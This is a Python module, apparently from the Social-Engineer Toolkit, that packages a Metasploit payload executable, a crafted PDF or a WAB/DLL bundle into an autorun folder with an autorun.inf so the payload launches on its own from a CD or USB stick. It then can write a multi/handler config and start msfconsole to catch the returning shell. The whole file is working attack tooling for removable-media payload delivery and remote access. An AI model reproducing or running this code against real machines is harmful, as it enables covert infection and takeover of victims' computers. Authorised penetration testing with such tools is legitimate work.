#!/usr/bin/env python
# simple autorun creation for set

import subprocess
import os
import re
import sys
from src.core.setcore import *
from time import sleep

#  [autorun]
#  open=autorun.exe
#  icon=autorun.ico

# define metasploit path
definepath = os.getcwd()
msf_path = meta_path()
me = mod_name()

trigger = 0
if os.path.isfile("src/program_junk/standardpayload.file"):
    trigger = 1
    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp src/html/msf.exe autorun/program.exe 1> /dev/null 2> /dev/null;cp src/program_junk/msf.exe autorun/program.exe 1> /dev/null 2>/dev/null", shell=True).wait()
if os.path.isfile("src/program_junk/fileformat.file"):
    trigger = 2
    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp src/program_junk/template.pdf autorun/ 1> /dev/null 2>/dev/null", shell=True).wait()

if os.path.isfile("src/program_junk/dll/openthis.wab"):
    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp src/program_junk/dll/* autorun/ 1> /dev/null 2> /dev/null", shell=True).wait()
    trigger = 3

filewrite = file("autorun/autorun.inf", "w")

# if we are using shellcodeexec
alpha_data = ""
if os.path.isfile("src/program_junk/meterpreter.alpha"):
        fileopen = file("src/program_junk/meterpreter.alpha", "r")
        alpha_data = fileopen.read().rstrip()
        

# if using standard payloads
if trigger == 1:
    payload = "program.exe \"" + alpha_data + "\""

# if using pdf payload
if trigger == 2:
    payload = "template.pdf"

if trigger == 3:
    payload = "openthis.wab"

filewrite.write("""[autorun]
open=%s
icon=autorun.ico""" % (payload))
filewrite.close()
print_status("Your attack has been created in the SET home directory folder 'autorun'")
print_info("Copy the contents of the folder to a CD/DVD/USB to autorun")

# if we are doing the custom pdf
if trigger == 2 or trigger == 3:
# j0fer 06-27-2012 #   choice1 = raw_input(setprompt("0", "Create a listener right now [yes|no]"))
    choice1 = yesno_prompt("0", "Create a listener right now [yes|no]")
# j0fer 06-27-2012 #    if choice1 == "yes" or choice1 == "y" or choice1 == "":
    if choice1 == "YES":
        filewrite = file("src/program_junk/meta_config", "w")
        fileopen = file("src/program_junk/payload.options", "r")
        for line in fileopen:
            line = line.split(" ")
            filewrite.write("use multi/handler\n")
            filewrite.write("set payload " + line[0] + "\n")
            filewrite.write("set lhost " + line[1] + "\n")
            filewrite.write("set lport " + line[2] + "\n")
            filewrite.write("exploit -j")
            filewrite.close()
        subprocess.Popen("ruby %s/msfconsole -L -n -r %s/src/program_junk/meta_config" % (msf_path, definepath), shell=True).wait()
    else:
        print_warning("cancelling...")
        sleep (2)
